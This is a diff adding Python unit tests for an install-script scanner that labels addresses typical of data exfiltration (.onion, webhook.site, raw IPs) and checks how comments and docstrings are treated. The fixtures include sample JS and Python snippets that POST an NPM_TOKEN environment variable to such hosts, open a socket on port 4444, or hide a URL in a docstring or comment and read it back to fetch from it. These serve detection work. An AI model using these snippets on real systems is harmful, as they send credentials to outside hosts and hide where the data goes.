@@ -545,5 +545,103 @@ class FetchFallbackTests(unittest.TestCase):
         self.assertIn("runs code it receives over the network", core.install_script_risk(text, lang="js"))
 
 
+class AddressLabelTests(unittest.TestCase):
+    """D-22 (0.1.9): an address label (where a send goes, and a raw IP address, a reason of its own) is read in the
+    code, its comments (and Python's docstrings) blanked: inspect-ai's view bundle "contacts an address typical of
+    data exfiltration (.onion)" from linkify-it's doc comment (`.tlds('onion', true)`, the unofficial `.onion`
+    domain), named once a send was found. Reworked after an independent review: only where no code may read that
+    prose back. Twin of exfiltration.test.js's."""
+
+    LABEL = "contacts an address typical of data exfiltration ({})"
+    SENT = "sends environment variables over the network (NPM_TOKEN)"
+
+    def labels(self, text, lang):
+        return [r for r in core.install_script_risk(text, lang=lang) if r.startswith(self.LABEL[:30])]
+
+    def js(self, host):
+        return f"const v = process.env.NPM_TOKEN;\nfetch('{host}/c', {{ method: 'POST', body: v }});\n"
+
+    def py(self, host):
+        return f"import os, requests\nrequests.post('{host}/c', data=os.environ['NPM_TOKEN'])\n"
+
+    def test_a_comments_address_is_no_label(self):
+        send = self.js("https://collect.invalid")
+        self.assertEqual(core.install_script_risk(send, lang="js"), [self.SENT])
+        for comment in ("// linkify.tlds('onion', true) // add the unofficial `.onion` domain\n",
+                        "/* a capture service for tests: https://webhook.site/0000 */\n",
+                        "// a mirror: http://203.0.113.9/files\n"):
+            with self.subTest(comment):
+                self.assertEqual(self.labels(comment + send, "js"), [])
+                self.assertEqual(self.labels("#!/usr/bin/env node\n" + comment + send, None), [])
+        for prose in ("# results also go to https://webhook.site/0000\n", '"""Uploads to pipedream.net when asked."""\n',
+                      "# a mirror: http://203.0.113.9/files\n"):
+            with self.subTest(prose):
+                self.assertEqual(self.labels(prose + self.py("https://collect.invalid"), "py"), [])
+
+    def test_unknown_file_reads_and_failed_python_keep_raw_text(self):
+        cases = [('js',
+          '// http://203.0.113.9/p\n'
+          'const fs=require("fs");const name=["install","js"].join(".");const '
+          'u=fs.readFileSync(name,"utf8").split("\\n")[0].slice(3);require("http").get(u);'),
+         ('js',
+          '// http://203.0.113.9/p\n'
+          'const fs=require("fs");const [,name]=process.argv;const '
+          'u=fs.readFileSync(name,"utf8");require("http").get(u);'),
+         ('js',
+          '// http://203.0.113.9/p\n'
+          'const f=require("fs");const r=f["read"+"FileSync"];require("http").get(r(name,"utf8"));'),
+         ('py',
+          '# http://203.0.113.9/p\n'
+          'import sys, urllib.request\n'
+          'u=open(sys.argv[:1][0]).readline()[2:].strip()\n'
+          'urllib.request.urlopen(u)'),
+         ('py',
+          '# http://203.0.113.9/p\n'
+          'import urllib.request\n'
+          'u=open(".".join(["install","py"])).readline()[2:].strip()\n'
+          'urllib.request.urlopen(u)'),
+         ('py', '# http://203.0.113.9/p\nx = ('),
+         ('py', '# http://203.0.113.9/p\nx = "unterminated')]
+        for lang, text in cases:
+            with self.subTest(lang=lang, text=text):
+                self.assertIn(self.LABEL.format("http://203.0.113.9"), core.install_script_risk(text, lang=lang))
+
+    def test_the_codes_address_is_one(self):
+        for text, lang, shown in ((self.js("https://abcdefghijklmnop.onion"), "js", ".onion"),
+                                  (self.js("https://webhook.site"), "js", "webhook.site"),
+                                  (self.js("http://203.0.113.9"), "js", "http://203.0.113.9"),
+                                  ("const doc = 'see example.onion';\n" + self.js("https://collect.invalid"), "js", ".onion"),
+                                  ("/* tests: https://webhook.site/0000 */\n" + self.js("https://abcdefghijklmnop.onion"), "js",
+                                   ".onion"),
+                                  (self.py("https://webhook.site"), "py", "webhook.site"),
+                                  (self.py("http://203.0.113.9"), "py", "http://203.0.113.9")):
+            with self.subTest(shown):
+                self.assertEqual(self.labels(text, lang), [self.LABEL.format(shown)])
+
+    def test_prose_the_code_reads_back(self):
+        # reworked after an independent review (its HIGH-3): a text that may read its prose back is read as it is —
+        # a docstring read back, a function's source (JavaScript keeps a function's comments wherever its source is
+        # read), its own file. The raw IP address is a reason of its own: no send is needed.
+        ip = [self.LABEL.format("http://203.0.113.9")]
+        doc = 'def where():\n    """http://203.0.113.9/p"""\n'
+        tail = "\nconst u = where.toString().slice(23, -3);\nrequire('http').get(u);\n"
+        for text, lang in (("import urllib.request\n" + doc + "urllib.request.urlopen(where.__doc__)\n", "py"),
+                           ('import urllib.request\nclass Cfg:\n    """http://203.0.113.9/p"""\nurllib.request.urlopen(Cfg.__doc__)\n', "py"),
+                           ("import inspect, urllib.request\n" + doc + "urllib.request.urlopen(inspect.getdoc(where))\n", "py"),
+                           ("# http://203.0.113.9/p\nimport urllib.request\nurllib.request.urlopen(open(__file__).readline()[2:].strip())\n", "py"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail, "js"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "String(where)"), "js"),
+                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "`${where}`"), "js"),
+                           ("// http://203.0.113.9/p\nconst fs = require('fs');\n"
+                            "const u = fs.readFileSync('install.js', 'utf8').split('\\n')[0].slice(3);\nrequire('http').get(u);\n", "js")):
+            with self.subTest(text):
+                self.assertEqual(self.labels(text, lang), ip)
+        sock = 'import socket\ndef where():\n    """203.0.113.9"""\ns = socket.socket()\ns.connect((where.__doc__, 4444))\n'
+        self.assertEqual(core.install_script_risk(sock, lang="py"), [self.LABEL.format("203.0.113.9")])
+        env = ('import os, requests\ndef where():\n    """https://webhook.site/0000"""\n'
+               "requests.post(where.__doc__, data=os.environ['NPM_TOKEN'])\n")
+        self.assertEqual(self.labels(env, "py"), [self.LABEL.format("webhook.site")])
+
+
 if __name__ == "__main__":
     unittest.main()
